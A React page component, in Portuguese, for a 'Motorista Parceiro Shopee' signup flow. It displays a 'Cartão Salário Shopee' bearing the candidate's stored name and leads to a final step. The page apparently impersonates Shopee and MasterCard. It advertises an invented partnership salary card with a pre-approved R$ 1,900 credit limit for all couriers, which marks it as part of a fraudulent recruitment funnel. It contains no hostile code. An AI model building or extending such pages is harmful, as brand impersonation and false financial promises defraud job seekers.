import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import CommentsSection from '@/components/CommentsSection';
import { useScrollTop } from '@/hooks/use-scroll-top';

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const [candidatoData, setCandidatoData] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);

  // Função para formatar o nome do cartão
  const formatCardName = (fullName: string) => {
    if (!fullName) return 'CANDIDATO';
    
    // Lista de preposições a serem removidas
    const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
    
    // Dividir o nome em palavras e converter para maiúsculo
    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
    
    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
    const validNames = words.filter(word => !prepositions.includes(word));
    
    // Retornar os dois primeiros nomes válidos
    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
  };


  const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';

  const handleProsseguir = () => {
    // Salvar dados de pagamento no localStorage
    try {
      const dadosPagamento = {
        metodo: 'cartao_salario'
      };
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      console.log('💾 Dados de pagamento salvos');
    } catch(e) {
      console.log('❌ Erro ao salvar dados de pagamento:', e);
    }
    
    // Redirecionar direto para /finalizacao
    navigate('/finalizacao');
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow">
        <main className="container mx-auto my-4 px-4">
          <div className="flex justify-center">
            <div className="w-full max-w-4xl">
              <div className="bg-white rounded-lg shadow-sm border border-gray-200">
                <div className="bg-[#E83D22] text-white p-4 rounded-t-lg">
                  <h5 className="text-xl font-semibold mb-0">Forma de Pagamento</h5>
                </div>
                <div className="p-6">
                  <div className="my-4">
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
                      <div className="text-center">
                        <div className="relative inline-block">
                          <img 
                            src="https://i.ibb.co/VWZ2B4jv/Inserir-um-ti-tulo-4-1-1.webp" 
                            alt="Cartão Salário Shopee" 
                            className="max-w-full w-80 h-auto rounded-2xl"
                          />
                          <div 
                            className="absolute font-bold text-lg tracking-wide"
                            style={{
                              bottom: '35px',
                              left: '30px',
                              fontFamily: 'Courier New, Courier, monospace',
                              color: '#FFFFFF',
                              textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
                            }}
                          >
                            {nomeCartao}
                          </div>
                        </div>
                      </div>
                      <div>
                        <h4 className="text-[#E83D22] font-bold text-2xl mb-5 text-left">
                          Cartão Salário Shopee
                        </h4>
                        <p className="text-gray-700 text-base leading-relaxed mb-5 text-left">
                          Seu salário será depositado automaticamente no <strong>Cartão Salário da Shopee</strong>, uma parceria exclusiva com a MasterCard.
                        </p>
                        
                        <div className="space-y-4 text-left">
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Sem taxa de saque</strong> em qualquer caixa eletrônico</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Função débito e crédito</strong> integradas</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Limite de crédito de R$ 1.900,00</strong> pré-aprovado</span>
                          </div>
                        </div>
                        
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-5">
                          <div className="flex items-start">
                            <i className="fas fa-info-circle text-blue-600 mr-2 mt-1"></i>
                            <div>
                              <small className="text-gray-700">
                                <strong>Benefício exclusivo:</strong> A Shopee em parceria com a MasterCard liberou um limite de crédito especial de R$ 1.900,00 para todos os entregadores.
                              </small>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-center mt-6">
                    <button
                      onClick={handleProsseguir}
                      disabled={isLoading}
                      data-action="continue"
                      data-testid="button-prosseguir"
                      className={`
                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
                        px-6 py-3 border-none rounded transition-opacity duration-200
                        inline-flex items-center relative cursor-pointer
                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
                      `}
                      style={{ 
                        fontFamily: 'Inter, sans-serif',
                        fontWeight: 800,
                        fontSize: '14px'
                      }}
                    >
                      {isLoading && (
                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
                      )}
                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
                    </button>
                    {/* Redirecion para /finalizacao */}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      
      <div className="container mx-auto px-4">
        <CommentsSection />
      </div>
      
      <Footer />
    </div>
  );
};

export default Recebedor;